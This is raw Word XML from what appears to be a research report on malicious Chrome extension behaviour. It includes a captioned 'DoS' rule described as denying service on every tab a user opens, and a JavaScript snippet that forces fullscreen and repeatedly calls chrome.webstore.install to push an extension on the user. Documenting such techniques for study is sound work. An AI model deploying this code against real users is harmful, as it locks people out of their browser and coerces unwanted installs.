                        <w:t>;</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">  </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t>})</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t>;</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:br/>
                      </w:r>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t>}</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="3C13BB0F" w14:textId="77777777" w:rsidR="006A6E3D" w:rsidRPr="00655814" w:rsidRDefault="006A6E3D" w:rsidP="00967A35">
                      <w:pPr>
                        <w:pStyle w:val="HTMLPreformatted"/>
                        <w:shd w:val="clear" w:color="auto" w:fill="2B2B2B"/>
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                    <w:p w14:paraId="1A37F834" w14:textId="1EF9D254" w:rsidR="006A6E3D" w:rsidRPr="00655814" w:rsidRDefault="006A6E3D">
                      <w:pPr>
                        <w:rPr>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="square" anchorx="margin"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00F66EC0" w:rsidRPr="00F66EC0">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>Rule 2: DoS.</w:t>
      </w:r>
      <w:bookmarkEnd w:id="158"/>
    </w:p>
    <w:p w14:paraId="00A7E9BB" w14:textId="3715E586" w:rsidR="001175B2" w:rsidRPr="00C86CEE" w:rsidRDefault="009E02A4" w:rsidP="009E02A4">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="159" w:name="_Ref514844013"/>
      <w:bookmarkStart w:id="160" w:name="_Toc523071580"/>
      <w:r w:rsidRPr="00C86CEE">
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="00C86CEE">
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="006A6E3D">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>8</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="00C86CEE">
        <w:t>: DoS.</w:t>
      </w:r>
      <w:bookmarkEnd w:id="159"/>
      <w:bookmarkEnd w:id="160"/>
    </w:p>
    <w:p w14:paraId="44BE5C50" w14:textId="77777777" w:rsidR="001175B2" w:rsidRDefault="00F66EC0" w:rsidP="001175B2">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F66EC0">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>This rule is similar to the previous one but the denial of service targets each tab the users tries to open. This prevents the user from using any Chrome’s service.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55E83770" w14:textId="77777777" w:rsidR="001175B2" w:rsidRDefault="001175B2" w:rsidP="00F66EC0">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="48A3A8D7" w14:textId="77777777" w:rsidR="001175B2" w:rsidRDefault="001175B2" w:rsidP="00F66EC0">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="49912230" w14:textId="77777777" w:rsidR="001175B2" w:rsidRDefault="001175B2" w:rsidP="00F66EC0">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5FD95C5C" w14:textId="77777777" w:rsidR="001175B2" w:rsidRPr="00F66EC0" w:rsidRDefault="001175B2" w:rsidP="00F66EC0">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:bookmarkStart w:id="161" w:name="_Toc523071516"/>
    <w:p w14:paraId="478843A2" w14:textId="0F738E9A" w:rsidR="009E02A4" w:rsidRDefault="00967A35" w:rsidP="00967A35">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="45720" distB="45720" distL="114300" distR="114300" simplePos="0" relativeHeight="251659264" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="23A48886" wp14:editId="5CC4FAF8">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:align>right</wp:align>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>394335</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="5934075" cy="2124075"/>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124075"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln w="9525">
                          <a:noFill/>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="34A2455B" w14:textId="52174279" w:rsidR="006A6E3D" w:rsidRPr="00581271" w:rsidRDefault="006A6E3D" w:rsidP="00BB69E8">
                            <w:pPr>
                              <w:pStyle w:val="HTMLPreformatted"/>
                              <w:shd w:val="clear" w:color="auto" w:fill="2B2B2B"/>
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:b/>
                                <w:bCs/>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t xml:space="preserve">function </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:color w:val="FFC66D"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>checkup</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>(){</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">    </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:b/>
                                <w:bCs/>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>if</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>((window.fullScreen) || (window.innerWidth == screen.width &amp;&amp;</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">    window.innerHeight == screen.height)) {</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">        chrome.webstore.install(&lt;extension_url&gt;,</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:color w:val="FFC66D"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> successCallback</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t xml:space="preserve">, </w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">        </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>failureCallback)</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>;</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">   </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>}</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">   </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:b/>
                                <w:bCs/>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t xml:space="preserve">else </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>{</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">      document.documentElement.</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:color w:val="FFC66D"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>webkitRequestFullScreen</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>()</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>;</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">      </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>chrome.webstore.install&lt;extension_url&gt;</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>,</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:color w:val="FFC66D"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>successCallback</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t xml:space="preserve">, </w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">      </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>failureCallback)</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>;</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">   </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>}</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                              <w:t>}</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="2B7AF82B" w14:textId="77777777" w:rsidR="006A6E3D" w:rsidRPr="00655814" w:rsidRDefault="006A6E3D" w:rsidP="00BB69E8">
                            <w:pPr>
                              <w:pStyle w:val="HTMLPreformatted"/>
                              <w:shd w:val="clear" w:color="auto" w:fill="2B2B2B"/>
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                            </w:pPr>
                          </w:p>
                          <w:p w14:paraId="168F604E" w14:textId="3A91D352" w:rsidR="006A6E3D" w:rsidRPr="00655814" w:rsidRDefault="006A6E3D">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A48886" id="_x0000_s1032" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:416.05pt;margin-top:31.05pt;width:467.25pt;height:167.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" filled="f" stroked="f">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="34A2455B" w14:textId="52174279" w:rsidR="006A6E3D" w:rsidRPr="00581271" w:rsidRDefault="006A6E3D" w:rsidP="00BB69E8">
                      <w:pPr>
                        <w:pStyle w:val="HTMLPreformatted"/>
                        <w:shd w:val="clear" w:color="auto" w:fill="2B2B2B"/>
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:b/>
                          <w:bCs/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t xml:space="preserve">function </w:t>
                      </w:r>
                      <w:proofErr w:type="gramStart"/>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="FFC66D"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>checkup</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>(</w:t>
                      </w:r>
                      <w:proofErr w:type="gramEnd"/>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>){</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">    </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:b/>
                          <w:bCs/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>if</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>((</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>window.fullScreen</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>) || (</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>window.innerWidth</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> == </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>screen.width</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> &amp;&amp;</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">    </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>window.innerHeight</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> == </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>screen.height</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>)) {</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">        </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>chrome.webstore.install</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>(&lt;</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>extension_url</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>&gt;,</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="FFC66D"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="FFC66D"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>successCallback</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t xml:space="preserve">, </w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">        </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>failureCallback</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>)</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>;</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">   </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>}</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">   </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:b/>
                          <w:bCs/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t xml:space="preserve">else </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>{</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">      </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>document.documentElement.</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="FFC66D"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>webkitRequestFullScreen</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>()</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>;</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">      </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>chrome.webstore.install</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>&lt;</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>extension_url</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>&gt;</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>,</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="FFC66D"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>successCallback</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t xml:space="preserve">, </w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
